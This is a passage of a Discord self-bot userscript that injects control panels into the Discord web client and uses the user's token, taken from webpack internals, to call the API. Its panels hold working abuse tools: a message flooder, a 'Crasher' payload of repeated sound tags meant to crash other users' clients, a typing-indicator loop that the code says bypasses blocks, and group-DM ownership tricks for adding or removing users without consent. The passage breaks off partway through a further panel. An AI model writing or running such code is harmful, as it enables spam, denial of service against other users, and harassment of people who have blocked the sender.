  startButton.style.cursor = 'pointer';
  startButton.style.width = '100%';
  startButton.style.fontSize = '16px';
  uiContainer11.appendChild(startButton);

  // Create and append the Status label
  const statusLabel3 = document.createElement('div');
  statusLabel3.textContent = 'Status: Idle';
  statusLabel3.style.color = 'white';
  uiContainer11.appendChild(statusLabel3);

  // Function to send the request
  function sendRequest(channelId, message) {
    return fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
      headers: {
        "accept-language": "en-US",
        "authorization": (webpackChunkdiscord_app.push([[''], {}, e => {
          m = [];
          for (let c in e.c) m.push(e.c[c]);
        }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(),
        "content-type": "application/json"
      },
      body: JSON.stringify({
        mobile_network_type: "unknown",
        content: message,
        tts: false,
        flags: 0
      }),
      method: "POST"
    })
    .then(response => {
      if (response.status === 429) {
        throw new Error('Rate limit exceeded');
      }
      return response.json();
    })
    .then(data => {
      console.log('Message posted:', data);
      return data;
    })
    .catch(error => {
      console.error('Error posting message:', error);
      throw error; // Propagate the error for further handling
    });
  }

  // Handle Start button click
  startButton.addEventListener('click', () => {
    const speed = parseInt(speedInput2.value, 10);
    const messageCount = parseInt(messageCountInput.value, 10);
    const channelId = channelIdInput.value.trim();
    const message = messageInput5.value.trim();

    if (!channelId || !message) {
      statusLabel3.textContent = 'Status: Please provide a Channel ID and Message.';
      return;
    }

    if (speed < 0) {
      errorLabel2.style.display = 'block'; // Show error label
      return;
    } else {
      errorLabel2.style.display = 'none'; // Hide error label
    }

    if (speed < 500) {
      cautionLabel.style.display = 'block'; // Show caution label
    } else {
      cautionLabel.style.display = 'none'; // Hide caution label
    }

    let counter = 0;
    let successCount = 0;
    let completedWithErrors = false;
    statusLabel3.textContent = 'Status: Executing...';

    // Interval function to execute sendRequest a specified number of times
    const intervalId = setInterval(() => {
      if (counter < messageCount) {
        const startTime = Date.now();

        sendRequest(channelId, message)
          .then(() => {
            counter++;
            successCount++;
            const elapsedTime = Date.now() - startTime;
            const adjustedSpeed = Math.max(speed - elapsedTime, 0);

            // Adjust interval to handle any delays
            if (counter >= messageCount) {
              clearInterval(intervalId);
              if (completedWithErrors) {
                statusLabel3.textContent = `Status: Only completed ${successCount} times instead of ${messageCount} times because of rate limiting.`;
              } else {
                statusLabel3.textContent = `Status: Completed ${successCount} times.`;
              }
            }
          })
          .catch(error => {
            if (error.message === 'Rate limit exceeded') {
              // Adjust the status message to reflect rate limit errors
              completedWithErrors = true;
            }
          });
      } else {
        clearInterval(intervalId);
        if (!completedWithErrors) {
          statusLabel3.textContent = `Status: Completed ${successCount} times.`;
        }
      }
    }, speed);
  });
})();





(function() {
    // Create the main UI container
    const uiContainer12 = document.createElement('div');
    uiContainer12.style.position = 'fixed';
    uiContainer12.style.bottom = '20px';
    uiContainer12.style.right = '20px';
    uiContainer12.style.width = '350px';
    uiContainer12.style.backgroundColor = 'black';
    uiContainer12.style.color = 'white';
    uiContainer12.style.zIndex = '2000';
    uiContainer12.style.display = 'none';
    uiContainer12.style.flexDirection = 'column';
    uiContainer12.style.justifyContent = 'space-between';
    uiContainer12.style.alignItems = 'center';
    uiContainer12.style.padding = '20px';
    uiContainer12.style.border = '1px solid white';
    uiContainer12.style.borderRadius = '10px';
    uiContainer12.style.fontFamily = 'GG Sans, sans-serif';
    document.body.appendChild(uiContainer12);

// Create and style the open button for the new UI container
const openNewButton12 = document.createElement('button');
openNewButton12.textContent = 'Page 12';
openNewButton12.style.position = 'fixed';
openNewButton12.style.bottom = '100px';
openNewButton12.style.right = '54px';
openNewButton12.style.zIndex = '1000';
openNewButton12.style.padding = '10px';
openNewButton12.style.backgroundColor = '#333';
openNewButton12.style.color = 'white';
openNewButton12.style.border = 'none';
openNewButton12.style.borderRadius = '5px';
document.body.appendChild(openNewButton12);

// Create and style the close button for the new UI container
const closeNewButton12 = document.createElement('button');
closeNewButton12.textContent = 'Close';
closeNewButton12.style.padding = '10px';
closeNewButton12.style.backgroundColor = '#333';
closeNewButton12.style.color = 'white';
closeNewButton12.style.border = 'none';
closeNewButton12.style.borderRadius = '5px';
closeNewButton12.style.marginTop = '10px';
uiContainer12.appendChild(closeNewButton12);

// Show the new UI container when the open button is pressed
openNewButton12.addEventListener('click', () => {
  uiContainer12.style.display = 'block';
  openNewButton12.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton12.addEventListener('click', () => {
  uiContainer12.style.display = 'none';
  openNewButton12.style.display = 'block';
});

    // Create the title label
    const titleLabel12 = document.createElement('h1');
    titleLabel12.textContent = 'Crasher';
    titleLabel12.style.fontSize = '24px';
    titleLabel12.style.marginBottom = '10px';
    uiContainer12.appendChild(titleLabel12);

    // Create the subtitle label
    const subtitleLabel = document.createElement('p');
    subtitleLabel.textContent = 'This can legitimately crash people\'s Discords. It makes no sense. It just happens.';
    subtitleLabel.style.fontSize = '14px';
    subtitleLabel.style.marginBottom = '20px';
    uiContainer12.appendChild(subtitleLabel);

    // Create the Send button
    const sendButton7 = document.createElement('button');
    sendButton7.textContent = 'Crash users in channel currently on';
    sendButton7.style.marginBottom = '20px';
    sendButton7.style.padding = '10px';
    sendButton7.style.backgroundColor = 'black';
    sendButton7.style.color = 'white';
    sendButton7.style.border = '1px solid white';
    sendButton7.style.cursor = 'pointer';
    sendButton7.style.width = '100%';
    sendButton7.style.fontSize = '16px';
    uiContainer12.appendChild(sendButton7);

    // Function to fetch the token
    function getToken() {
        return (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m)
            .find(m => m?.exports?.default?.getToken !== void 0)
            .exports.default.getToken();
    }

    // Function to send the crash message
    async function sendCrashMessage() {
        const channelId = window.location.href.split('/').pop();
        const message = "Right click this message, click copy, paste it, press enter, then press your up arrow.<sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0><sound:0>";

        const token = getToken();

        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
            "headers": {
                "accept-language": "en-US",
                "authorization": token,
                "content-type": "application/json"
            },
            "body": JSON.stringify({
                "content": message,
                "tts": false,
                "flags": 0
            }),
            "method": "POST"
        });

        if (response.ok) {
            console.log('Crash message sent successfully');
        } else {
            console.error('Error sending crash message:', response.statusText);
        }
    }

    // Handle the Send button click
    sendButton7.addEventListener('click', sendCrashMessage);
})();







(function() {
  // Create the main UI container
  const uiContainer13 = document.createElement('div');
  uiContainer13.style.position = 'fixed';
  uiContainer13.style.bottom = '20px';
  uiContainer13.style.right = '20px';
  uiContainer13.style.width = '350px';
  uiContainer13.style.height = 'auto';
  uiContainer13.style.backgroundColor = 'black';
  uiContainer13.style.color = 'white';
  uiContainer13.style.zIndex = '2000';
  uiContainer13.style.display = 'none';
  uiContainer13.style.flexDirection = 'column';
  uiContainer13.style.justifyContent = 'space-between';
  uiContainer13.style.alignItems = 'center';
  uiContainer13.style.padding = '20px';
  uiContainer13.style.border = '1px solid white';
  uiContainer13.style.borderRadius = '10px';
  uiContainer13.style.fontFamily = 'GG Sans, sans-serif';
  document.body.appendChild(uiContainer13);

// Create and style the open button for the new UI container
const openNewButton13 = document.createElement('button');
openNewButton13.textContent = 'Page 13';
openNewButton13.style.position = 'fixed';
openNewButton13.style.bottom = '60px';
openNewButton13.style.right = '182px';
openNewButton13.style.zIndex = '1000';
openNewButton13.style.padding = '10px';
openNewButton13.style.backgroundColor = '#333';
openNewButton13.style.color = 'white';
openNewButton13.style.border = 'none';
openNewButton13.style.borderRadius = '5px';
document.body.appendChild(openNewButton13);

// Create and style the close button for the new UI container
const closeNewButton13 = document.createElement('button');
closeNewButton13.textContent = 'Close';
closeNewButton13.style.padding = '10px';
closeNewButton13.style.backgroundColor = '#333';
closeNewButton13.style.color = 'white';
closeNewButton13.style.border = 'none';
closeNewButton13.style.borderRadius = '5px';
closeNewButton13.style.marginTop = '10px';
uiContainer13.appendChild(closeNewButton13);

// Show the new UI container when the open button is pressed
openNewButton13.addEventListener('click', () => {
  uiContainer13.style.display = 'block';
  openNewButton13.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton13.addEventListener('click', () => {
  uiContainer13.style.display = 'none';
  openNewButton13.style.display = 'block';
});

  // Create and append the title label
  const titleLabel13 = document.createElement('div');
  titleLabel13.textContent = 'Message Blocked User';
  titleLabel13.style.color = 'white';
  titleLabel13.style.fontSize = '20px'; // Slightly larger font size
  titleLabel13.style.fontWeight = 'bold'; // Make it bold
  titleLabel13.style.marginBottom = '20px'; // Space below the title
  uiContainer13.appendChild(titleLabel13);

  // Create and append the user ID input
  const userIdLabel = document.createElement('label');
  userIdLabel.textContent = 'User ID:';
  userIdLabel.style.color = 'white';
  uiContainer13.appendChild(userIdLabel);

  const userIdInput3 = document.createElement('input');
  userIdInput3.type = 'text';
  userIdInput3.placeholder = 'Enter User ID';
  userIdInput3.style.marginBottom = '20px';
  userIdInput3.style.padding = '10px';
  userIdInput3.style.backgroundColor = 'black';
  userIdInput3.style.color = 'white';
  userIdInput3.style.border = '1px solid white';
  userIdInput3.style.width = '100%';
  userIdInput3.style.fontSize = '16px';
  uiContainer13.appendChild(userIdInput3);

  // Create and append the message input
  const messageLabel4 = document.createElement('label');
  messageLabel4.textContent = 'Message:';
  messageLabel4.style.color = 'white';
  uiContainer13.appendChild(messageLabel4);

  const messageInput5 = document.createElement('input');
  messageInput5.type = 'text';
  messageInput5.placeholder = 'Enter message content';
  messageInput5.style.marginBottom = '20px';
  messageInput5.style.padding = '10px';
  messageInput5.style.backgroundColor = 'black';
  messageInput5.style.color = 'white';
  messageInput5.style.border = '1px solid white';
  messageInput5.style.width = '100%';
  messageInput5.style.fontSize = '16px';
  uiContainer13.appendChild(messageInput5);

  // Create and append the Typing Indicator toggle button
  const typingToggleButton = document.createElement('button');
  typingToggleButton.textContent = 'Toggle Typing Indicator (off)';
  typingToggleButton.style.marginBottom = '10px';
  typingToggleButton.style.padding = '10px';
  typingToggleButton.style.backgroundColor = 'black';
  typingToggleButton.style.color = 'white';
  typingToggleButton.style.border = '1px solid white';
  typingToggleButton.style.cursor = 'pointer';
  typingToggleButton.style.width = '100%';
  typingToggleButton.style.fontSize = '16px';
  uiContainer13.appendChild(typingToggleButton);

  // Create and append the description label
  const typingDescriptionLabel = document.createElement('div');
  typingDescriptionLabel.textContent = 'This will make it so the target continuously sees you appearing to be typing even though you\'re not (this bypasses blocks).';
  typingDescriptionLabel.style.color = 'white';
  typingDescriptionLabel.style.marginBottom = '20px';
  typingDescriptionLabel.style.fontSize = '14px';
  typingDescriptionLabel.style.textAlign = 'center';
  uiContainer13.appendChild(typingDescriptionLabel);

  // Create and append the Send button
  const sendButton8 = document.createElement('button');
  sendButton8.textContent = 'Send';
  sendButton8.style.marginBottom = '20px';
  sendButton8.style.padding = '10px';
  sendButton8.style.backgroundColor = 'black';
  sendButton8.style.color = 'white';
  sendButton8.style.border = '1px solid white';
  sendButton8.style.cursor = 'pointer';
  sendButton8.style.width = '100%';
  sendButton8.style.fontSize = '16px';
  uiContainer13.appendChild(sendButton8);

  // Create and append the Status label
  const statusLabel4 = document.createElement('div');
  statusLabel4.textContent = 'Status: Idle';
  statusLabel4.style.color = 'white';
  uiContainer13.appendChild(statusLabel4);

  // Function to get the authorization token
  function getToken() {
    return (webpackChunkdiscord_app.push([[''], {}, e => {
      m = [];
      for (let c in e.c) m.push(e.c[c]);
    }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();
  }

  // Function to get the DM channel for the user
  async function getDMChannel(userId) {
    const token = getToken();
    const dmChannelResponse = await fetch("https://discord.com/api/v9/users/@me/channels", {
      headers: {
        "accept-language": "en-US,en;q=0.9",
        "authorization": token,
        "content-type": "application/json"
      },
      body: JSON.stringify({ recipient_id: userId }),
      method: "POST"
    });
    return dmChannelResponse.json();
  }

  // Function to send a typing indicator to the DM channel
  async function sendTypingIndicator(dmChannelId) {
    const typingResponse = await fetch(`https://discord.com/api/v9/channels/${dmChannelId}/typing`, {
      headers: {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": getToken()
      },
      method: "POST"
    });

    if (typingResponse.ok) {
      console.log('Typing indicator sent successfully');
    } else {
      console.error('Failed to send typing indicator', typingResponse.status, typingResponse.statusText);
    }
  }

  // Function to get the most recent message ID and content
  async function getMostRecentMessage(dmChannelId) {
    const messagesResponse = await fetch(`https://discord.com/api/v9/channels/${dmChannelId}/messages?limit=1`, {
      headers: {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": getToken()
      },
      method: "GET"
    });
    return messagesResponse.json();
  }

  // Function to update the most recent message
  async function updateMessageContent(dmChannelId, messageId, newContent) {
    // Get the current message content
    const currentMessages = await getMostRecentMessage(dmChannelId);
    const currentContent = currentMessages.length > 0 ? currentMessages[0].content : '';

    // Append the new content with a newline before it
    const updatedContent = currentContent + '\n' + newContent;

    const updateResponse = await fetch(`https://discord.com/api/v9/channels/${dmChannelId}/messages/${messageId}`, {
      headers: {
        "accept-language": "en-US,en;q=0.9",
        "authorization": getToken(),
        "content-type": "application/json"
      },
      body: JSON.stringify({ content: updatedContent }),
      method: "PATCH"
    });

    if (updateResponse.ok) {
      console.log('Message updated successfully');
    } else {
      console.error('Failed to update message', updateResponse.status, updateResponse.statusText);
    }
  }

  // Handle Typing Indicator toggle button
  let typingIntervalId = null;
  let isTypingActive = false;

  async function handleTypingToggle() {
    const userId = userIdInput3.value.trim();

    if (!userId) {
      statusLabel4.textContent = 'Status: Please provide a User ID.';
      typingToggleButton.textContent = 'Toggle Typing Indicator (off)'; // Ensure button reflects the off state
      return;
    }

    const dmChannel = await getDMChannel(userId);

    if (isTypingActive) {
      // Stop typing indicator
      clearInterval(typingIntervalId);
      typingIntervalId = null;
      typingToggleButton.textContent = 'Toggle Typing Indicator (off)';
      statusLabel4.textContent = 'Status: Typing indicator disabled';
    } else {
      // Start typing indicator
      typingIntervalId = setInterval(() => sendTypingIndicator(dmChannel.id), 9000);
      sendTypingIndicator(dmChannel.id); // Send immediately on toggle
      typingToggleButton.textContent = 'Toggle Typing Indicator (on)';
      statusLabel4.textContent = 'Status: Typing indicator enabled';
    }

    isTypingActive = !isTypingActive; // Toggle the state
  }

  async function handlesendButton8Click() {
    const userId = userIdInput3.value.trim();
    const message = messageInput5.value.trim();

    if (!userId || !message) {
      statusLabel4.textContent = 'Status: Please provide both User ID and message content.';
      return;
    }

    const dmChannel = await getDMChannel(userId);
    const messages = await getMostRecentMessage(dmChannel.id);

    if (messages.length > 0) {
      await updateMessageContent(dmChannel.id, messages[0].id, message);
      statusLabel4.textContent = 'Status: Message updated successfully';
    } else {
      statusLabel4.textContent = 'Status: No recent messages found to update.';
    }
  }

  // Attach event listeners
  typingToggleButton.addEventListener('click', handleTypingToggle);
  sendButton8.addEventListener('click', handlesendButton8Click);
})();








(function() {
    // Create the main UI container
    const uiContainer14 = document.createElement('div');
    uiContainer14.style.position = 'fixed';
    uiContainer14.style.bottom = '20px';
    uiContainer14.style.right = '20px';
    uiContainer14.style.width = '350px';
    uiContainer14.style.height = 'auto';
    uiContainer14.style.backgroundColor = 'black';
    uiContainer14.style.color = 'white';
    uiContainer14.style.zIndex = '2000';
    uiContainer14.style.display = 'none';
    uiContainer14.style.flexDirection = 'column';
    uiContainer14.style.justifyContent = 'space-between';
    uiContainer14.style.alignItems = 'center';
    uiContainer14.style.padding = '20px';
    uiContainer14.style.border = '1px solid white';
    uiContainer14.style.borderRadius = '10px';
    uiContainer14.style.fontFamily = 'GG Sans, sans-serif';
    document.body.appendChild(uiContainer14);

// Create and style the open button for the new UI container
const openNewButton14 = document.createElement('button');
openNewButton14.textContent = 'Page 14';
openNewButton14.style.position = 'fixed';
openNewButton14.style.bottom = '60px';
openNewButton14.style.right = '118px';
openNewButton14.style.zIndex = '1000';
openNewButton14.style.padding = '10px';
openNewButton14.style.backgroundColor = '#333';
openNewButton14.style.color = 'white';
openNewButton14.style.border = 'none';
openNewButton14.style.borderRadius = '5px';
document.body.appendChild(openNewButton14);

// Create and style the close button for the new UI container
const closeNewButton14 = document.createElement('button');
closeNewButton14.textContent = 'Close';
closeNewButton14.style.padding = '10px';
closeNewButton14.style.backgroundColor = '#333';
closeNewButton14.style.color = 'white';
closeNewButton14.style.border = 'none';
closeNewButton14.style.borderRadius = '5px';
closeNewButton14.style.marginTop = '10px';
uiContainer14.appendChild(closeNewButton14);

// Show the new UI container when the open button is pressed
openNewButton14.addEventListener('click', () => {
  uiContainer14.style.display = 'block';
  openNewButton14.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton14.addEventListener('click', () => {
  uiContainer14.style.display = 'none';
  openNewButton14.style.display = 'block';
});

    // Create the title label
    const titleLabel14 = document.createElement('h1');
    titleLabel14.textContent = 'Remove Users From Groups a Specific User Owns Without Ownership';
    titleLabel14.style.marginBottom = '20px';
    titleLabel14.style.fontSize = '24px';
    uiContainer14.appendChild(titleLabel14);
    
    // Create the notice label
    const noticeLabel = document.createElement('h1');
    noticeLabel.textContent = `Note: You need to notify the owner of the groups they own for this to work.`;
    noticeLabel.style.marginBottom = '20px';
    noticeLabel.style.fontSize = '13px';
    uiContainer14.appendChild(noticeLabel);

    // Create the Group ID label
    const groupIdLabel3 = document.createElement('label');
    groupIdLabel3.textContent = 'Group ID:';
    groupIdLabel3.style.marginBottom = '5px';
    groupIdLabel3.style.fontSize = '16px';
    groupIdLabel3.style.width = '100%';
    uiContainer14.appendChild(groupIdLabel3);

    // Create the Group ID input
    const groupIdInput3 = document.createElement('input');
    groupIdInput3.type = 'text';
    groupIdInput3.placeholder = 'Group ID';
    groupIdInput3.style.marginBottom = '20px';
    groupIdInput3.style.padding = '10px';
    groupIdInput3.style.backgroundColor = 'black';
    groupIdInput3.style.color = 'white';
    groupIdInput3.style.border = '1px solid white';
    groupIdInput3.style.width = '100%';
    groupIdInput3.style.fontSize = '16px';
    uiContainer14.appendChild(groupIdInput3);

    // Create the User ID label
    const userIdLabel2 = document.createElement('label');
    userIdLabel2.textContent = 'User ID:';
    userIdLabel2.style.marginBottom = '5px';
    userIdLabel2.style.fontSize = '16px';
    userIdLabel2.style.width = '100%';
    uiContainer14.appendChild(userIdLabel2);

    // Create the User ID input
    const userIdInput4 = document.createElement('input');
    userIdInput4.type = 'text';
    userIdInput4.placeholder = 'User ID';
    userIdInput4.style.marginBottom = '20px';
    userIdInput4.style.padding = '10px';
    userIdInput4.style.backgroundColor = 'black';
    userIdInput4.style.color = 'white';
    userIdInput4.style.border = '1px solid white';
    userIdInput4.style.width = '100%';
    userIdInput4.style.fontSize = '16px';
    uiContainer14.appendChild(userIdInput4);

    // Create the Remove button
    const removeButton = document.createElement('button');
    removeButton.textContent = 'Remove';
    removeButton.style.marginBottom = '20px';
    removeButton.style.padding = '10px';
    removeButton.style.backgroundColor = 'red';
    removeButton.style.color = 'white';
    removeButton.style.border = '1px solid white';
    removeButton.style.cursor = 'pointer';
    removeButton.style.width = '100%';
    removeButton.style.fontSize = '16px';
    uiContainer14.appendChild(removeButton);

    // Function to get the Discord token
    const getDiscordToken = () => {
        return (webpackChunkdiscord_app.push([[''], {}, e => {
            m = [];
            for (let c in e.c) m.push(e.c[c])
        }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();
    };

    // The fetch request to send the message
    const sendRemoveUserMessage = async (groupId, userId) => {
        const response = await fetch(`https://discord.com/api/v9/channels/${window.location.href.split('/').pop()}/messages`, {
            "headers": {
                "accept-language": "en-US,en;q=0.9",
                "authorization": getDiscordToken(),
                "content-type": "application/json",
            },
            "referrer": `https://discord.com/channels/@me/${groupId}`,
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": JSON.stringify({
                "mobile_network_type": "unknown",
                "content": `Removing user:${userId} from group:${groupId}`,
                "tts": false,
                "flags": 0
            }),
            "method": "POST"
        });
        if (response.ok) {
            console.log('Message sent successfully');
            return response.json();
        } else {
            console.error('Failed to send message:', response.statusText);
            return null;
        }
    };

    // The fetch request to delete the message
    const deleteMessage = async (messageId) => {
        const response = await fetch(`https://discord.com/api/v9/channels/${window.location.href.split('/').pop()}/messages/${messageId}`, {
            "headers": {
                "accept-language": "en-US,en;q=0.9",
                "authorization": getDiscordToken()
            },
            "method": "DELETE"
        });
        if (response.ok) {
            console.log('Message deleted successfully');
        } else {
            console.error('Failed to delete message:', response.statusText);
        }
    };

    // Handle the Remove button click
    removeButton.addEventListener('click', async () => {
        const groupId = groupIdInput3.value.trim();
        const userId = userIdInput4.value.trim();
        if (groupId && userId) {
            const messageData = await sendRemoveUserMessage(groupId, userId);
            if (messageData) {
                setTimeout(() => {
                    deleteMessage(messageData.id);
                }, 2000);
            }
        }
    });
})();











(function() {
    // Create the main UI container
    const uiContainer15 = document.createElement('div');
    uiContainer15.style.position = 'fixed';
    uiContainer15.style.bottom = '20px';
    uiContainer15.style.right = '20px';
    uiContainer15.style.width = '350px';
    uiContainer15.style.height = 'auto';
    uiContainer15.style.backgroundColor = 'black';
    uiContainer15.style.color = 'white';
    uiContainer15.style.zIndex = '2000';
    uiContainer15.style.display = 'none';
    uiContainer15.style.flexDirection = 'column';
    uiContainer15.style.justifyContent = 'space-between';
    uiContainer15.style.alignItems = 'center';
    uiContainer15.style.padding = '20px';
    uiContainer15.style.border = '1px solid white';
    uiContainer15.style.borderRadius = '10px';
    uiContainer15.style.fontFamily = 'GG Sans, sans-serif';
    document.body.appendChild(uiContainer15);

// Create and style the open button for the new UI container
const openNewButton15 = document.createElement('button');
openNewButton15.textContent = 'Page 15';
openNewButton15.style.position = 'fixed';
openNewButton15.style.bottom = '60px';
openNewButton15.style.right = '54px';
openNewButton15.style.zIndex = '1000';
openNewButton15.style.padding = '10px';
openNewButton15.style.backgroundColor = '#333';
openNewButton15.style.color = 'white';
openNewButton15.style.border = 'none';
openNewButton15.style.borderRadius = '5px';
document.body.appendChild(openNewButton15);

// Create and style the close button for the new UI container
const closeNewButton15 = document.createElement('button');
closeNewButton15.textContent = 'Close';
closeNewButton15.style.padding = '10px';
closeNewButton15.style.backgroundColor = '#333';
closeNewButton15.style.color = 'white';
closeNewButton15.style.border = 'none';
closeNewButton15.style.borderRadius = '5px';
closeNewButton15.style.marginTop = '10px';
uiContainer15.appendChild(closeNewButton15);

// Show the new UI container when the open button is pressed
openNewButton15.addEventListener('click', () => {
  uiContainer15.style.display = 'block';
  openNewButton15.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton15.addEventListener('click', () => {
  uiContainer15.style.display = 'none';
  openNewButton15.style.display = 'block';
});

    // Create the title label
    const titleLabel15 = document.createElement('h1');
    titleLabel15.textContent = `'Visibly' Add Users to Groups Without Being Their Friends`;
    titleLabel15.style.marginBottom = '20px';
    titleLabel15.style.fontSize = '18px';  // Adjust the font size if needed
    uiContainer15.appendChild(titleLabel15);

    // Create the Target input
    const targetInput = document.createElement('input');
    targetInput.type = 'text';
    targetInput.placeholder = 'Target User IDs (comma separated)';
    targetInput.style.marginBottom = '20px';
    targetInput.style.padding = '10px';
    targetInput.style.backgroundColor = 'black';
    targetInput.style.color = 'white';
    targetInput.style.border = '1px solid white';
    targetInput.style.width = '100%';
    targetInput.style.fontSize = '16px';
    uiContainer15.appendChild(targetInput);

    // Create the User Owner ID input
    const userOwnerIdInput = document.createElement('input');
    userOwnerIdInput.type = 'text';
    userOwnerIdInput.placeholder = 'User Owner ID';
    userOwnerIdInput.style.marginBottom = '20px';
    userOwnerIdInput.style.padding = '10px';
    userOwnerIdInput.style.backgroundColor = 'black';
    userOwnerIdInput.style.color = 'white';
    userOwnerIdInput.style.border = '1px solid white';
    userOwnerIdInput.style.width = '100%';
    userOwnerIdInput.style.fontSize = '16px';
    uiContainer15.appendChild(userOwnerIdInput);

    // Create the Additional IDs input
    const additionalIdsInput = document.createElement('input');
    additionalIdsInput.type = 'text';
    additionalIdsInput.placeholder = 'Additional IDs (comma separated)';
    additionalIdsInput.style.marginBottom = '20px';
    additionalIdsInput.style.padding = '10px';
    additionalIdsInput.style.backgroundColor = 'black';
    additionalIdsInput.style.color = 'white';
    additionalIdsInput.style.border = '1px solid white';
    additionalIdsInput.style.width = '100%';
    additionalIdsInput.style.fontSize = '16px';
    uiContainer15.appendChild(additionalIdsInput);

    // Create the Execute button
    const executeButton = document.createElement('button');
    executeButton.textContent = 'Execute';
    executeButton.style.marginBottom = '20px';
    executeButton.style.padding = '10px';
    executeButton.style.backgroundColor = 'black';
    executeButton.style.color = 'white';
    executeButton.style.border = '1px solid white';
    executeButton.style.cursor = 'pointer';
    executeButton.style.width = '100%';
    executeButton.style.fontSize = '16px';
    uiContainer15.appendChild(executeButton);

    // Function to get the bot token
    function getToken() {
        return (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m)
            .find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();
    }

    // Handle the Execute button click
    executeButton.addEventListener('click', async () => {
        const Victim = targetInput.value.trim().split(',').map(id => id.trim()).filter(id => id !== '');
        const UserOwnerId = userOwnerIdInput.value.trim();
        const AdditionalIds = additionalIdsInput.value.trim().split(',').map(id => id.trim()).filter(id => id !== '');

        const recipients = [...Victim, UserOwnerId, ...AdditionalIds];

        const headers = {
            "accept-language": "en-US,en;q=0.9",
            "authorization": getToken(),
            "content-type": "application/json"
        };

        try {
            // Step 1: POST request to create the channel
            const postResponse = await fetch("https://discord.com/api/v9/users/@me/channels", {
                headers: headers,
                body: JSON.stringify({ recipients: recipients }),
                method: "POST"
            });

            const postData = await postResponse.json();
            const channelId = postData.id; // Get the created channel ID

            // Step 2: PATCH request to update the owner
            const patchResponse = await fetch(`https://discord.com/api/v9/channels/${channelId}`, {
                headers: headers,
                body: JSON.stringify({ owner: UserOwnerId }),
                method: "PATCH"
            });

            const patchData = await patchResponse.json();

            // Step 3: DELETE request to delete the channel
            const deleteResponse = await fetch(`https://discord.com/api/v9/channels/${patchData.id}?silent=true`, {
                headers: headers,
                method: "DELETE"
            });

            if (deleteResponse.ok) {
                console.log("Channel deleted successfully");
            } else {
                console.log("Failed to delete the channel");
            }
        } catch (error) {
            console.error("Error:", error);
        }
    });
})();











(function() {
    // Create and style the main UI container
    const uiContainer16 = document.createElement('div');
    uiContainer16.style.position = 'fixed';
    uiContainer16.style.bottom = '20px';
    uiContainer16.style.right = '20px';
    uiContainer16.style.width = '350px';
    uiContainer16.style.backgroundColor = 'black';
    uiContainer16.style.color = 'white';
    uiContainer16.style.zIndex = '2000';
    uiContainer16.style.display = 'none';
    uiContainer16.style.padding = '20px';
    uiContainer16.style.border = '1px solid white';
    uiContainer16.style.borderRadius = '10px';
    uiContainer16.style.fontFamily = 'GG Sans, sans-serif';
    uiContainer16.style.boxSizing = 'border-box'; // Ensure padding and border are included in width and height calculations
    document.body.appendChild(uiContainer16);

// Create and style the open button for the new UI container
const openNewButton16 = document.createElement('button');
openNewButton16.textContent = 'Page 16';
openNewButton16.style.position = 'fixed';
openNewButton16.style.bottom = '20px';
openNewButton16.style.right = '150px';
openNewButton16.style.zIndex = '1000';
openNewButton16.style.padding = '10px';
openNewButton16.style.backgroundColor = '#333';
openNewButton16.style.color = 'white';
openNewButton16.style.border = 'none';
openNewButton16.style.borderRadius = '5px';
document.body.appendChild(openNewButton16);

// Create and style the close button for the new UI container
const closeNewButton16 = document.createElement('button');
closeNewButton16.textContent = 'Close';
closeNewButton16.style.padding = '10px';
closeNewButton16.style.backgroundColor = '#333';
closeNewButton16.style.color = 'white';
closeNewButton16.style.border = 'none';
closeNewButton16.style.borderRadius = '5px';
closeNewButton16.style.marginTop = '10px';
uiContainer16.appendChild(closeNewButton16);

